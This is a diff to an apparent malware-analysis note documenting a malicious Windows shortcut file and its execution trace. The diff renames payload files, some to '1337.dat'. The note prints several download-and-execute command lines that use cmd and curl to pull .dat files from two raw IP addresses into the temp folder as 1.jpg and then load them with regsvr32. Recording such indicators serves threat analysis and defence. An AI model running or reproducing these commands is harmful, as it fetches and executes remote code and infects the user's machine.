@@ -12,7 +12,7 @@
 
 lnk content:
 
-C:\Windows\System32\cmd.exe /q /c curl -o %temp%\1.jpg -O http://111.90.151.235/anything191.dat&&regsvr32 %temp%\1.jpg
+C:\Windows\System32\cmd.exe /q /c curl -o %temp%\1.jpg -O http://111.90.151.235/1337.dat&&regsvr32 %temp%\1.jpg
 C:\Windows\System32\cmd.exe /q /c curl -o %temp%\1.jpg -O http://194.36.191.243/191.dat&&regsvr32 %temp%\1.jpg
 
 ******************************
@@ -21,16 +21,16 @@ Exec >
 
 cmd /c C:\Users\Admin\AppData\Local\Temp\DocumentsFolder_615111_900666.lnk
 
-cmd.exe" /q /c curl -o C:\Users\Admin\AppData\Local\Temp\1.jpg -O http://111.90.151.235/082455.dat&&regsvr32 C:\Users\Admin\AppData\Local\Temp\1.jpg
+cmd.exe" /q /c curl -o C:\Users\Admin\AppData\Local\Temp\1.jpg -O http://111.90.151.235/1337.dat&&regsvr32 C:\Users\Admin\AppData\Local\Temp\1.jpg
 
-curl  -o C:\Users\Admin\AppData\Local\Temp\1.jpg -O http://111.90.151.235/082455.dat
+curl  -o C:\Users\Admin\AppData\Local\Temp\1.jpg -O http://111.90.151.235/1337.dat
 
 regsvr32  C:\Users\Admin\AppData\Local\Temp\1.jpg
 
 ******************************
 
 http://194.36.191.243/191.dat
-http://111.90.151.235/anthing191.dat
+http://111.90.151.235/1337.dat
 
 *************************************************
 
